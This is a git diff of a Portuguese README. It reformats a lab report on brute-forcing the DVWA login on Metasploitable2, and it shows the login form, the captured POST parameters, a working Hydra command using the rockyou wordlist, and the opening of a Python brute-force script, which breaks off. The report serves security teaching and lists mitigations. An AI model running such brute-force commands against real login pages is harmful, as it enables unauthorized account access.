@@ -1,13 +1,10 @@
-# Criando um Ataque Brute Force de senhas
-Criando um Ataque Brute Force de senhas com Hydra e Kali Linux
-
 # 🛡️ Relatório Técnico: Teste de Força Bruta em Autenticação Web (DVWA)
 
 Documentação prática de teste de segurança e auditoria de autenticação contra o Damn Vulnerable Web Application (DVWA) hospedado no Metasploitable2, demonstrando a identificação de vulnerabilidades em formulários de login e propondo controles defensivos.
 
 
 📋 Sumário
-
+```text
 1. Visão Geral
 2. Topologia do Laboratório
 3. Análise da Aplicação Alvo
@@ -15,20 +12,23 @@ Documentação prática de teste de segurança e auditoria de autenticação con
 5. Execução do Ataque de Força Bruta
 6. Vulnerabilidades Identificadas
 7. Medidas de Mitigação
+```
 
 
-1. Visão Geral
+# 1. Visão Geral
+
 O objetivo deste teste foi avaliar a resiliência do mecanismo de autenticação web do DVWA frente a ataques automatizados de força bruta (brute-force), além de identificar a presença de credenciais fracas/padrão.
 
-2. Topologia do Laboratório
+# 2. Topologia do Laboratório
 
 
-3. Análise da Aplicação Alvo
+# 3. Análise da Aplicação Alvo
+
 A inspeção da estrutura do código-fonte HTML da página de login (/dvwa/login.php) revelou a presença dos campos de formulário e a mensagem estática de falha enviada no corpo da resposta:
 
-📄 Código HTML do Formulário de Login (login.php)
+Código HTML do Formulário de Login (login.php)
 
-```
+```bash
 <form action="login.php" method="post">
     <fieldset>
         <label for="user">Username</label> 
@@ -43,17 +43,18 @@ A inspeção da estrutura do código-fonte HTML da página de login (/dvwa/login
 
 <div class="message">Login failed</div>
 ```
-4. Análise de Requisição e Payload (DevTools)
+# 4. Análise de Requisição e Payload (DevTools)
 
 Através do painel Developer Tools (Aba Network), inspecionou-se a requisição HTTP POST enviada no momento da submissão:
 
 🔍 Dados do Form Payload (HTTP POST)
-
+```bash
 username: admin
 
 password: 123456
 
 Login: Login
+```
 
 ```text
 POST /dvwa/login.php HTTP/1.1
@@ -71,14 +72,16 @@ Figura 1: Captura do painel DevTools mostrando os parâmetros exatos do formulá
 5.1 Preparação do Ambiente
 Inicialmente, realizou-se a descompactação da wordlist rockyou.txt nativa do Kali Linux:
 
-```
+```bash
 sudo gunzip /usr/share/wordlists/rockyou.txt.gz
 ```
 
 5.2 Execução com THC-Hydra
 Para evitar erros de parsing e falsos positivos associados a métodos genéricos (como ocorreu no teste preliminar com a ferramenta Medusa), utilizou-se o módulo http-post-form do Hydra, definindo explicitamente o indicador de falha :F=Login failed:
 
-```hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.4 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"```
+```bash
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.4 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed"
+```
 
 figura 2
 
@@ -112,7 +115,7 @@ Para sanar as falhas apontadas, recomenda-se a aplicação das seguintes diretri
 
 1. Script em Python utilizando a biblioteca requests para automatizar esse ataque de força bruta via código, servindo como uma alternativa programática ao uso do Hydra.
 
-```
+```bash
 import requests
 
 # Configurações do Alvo
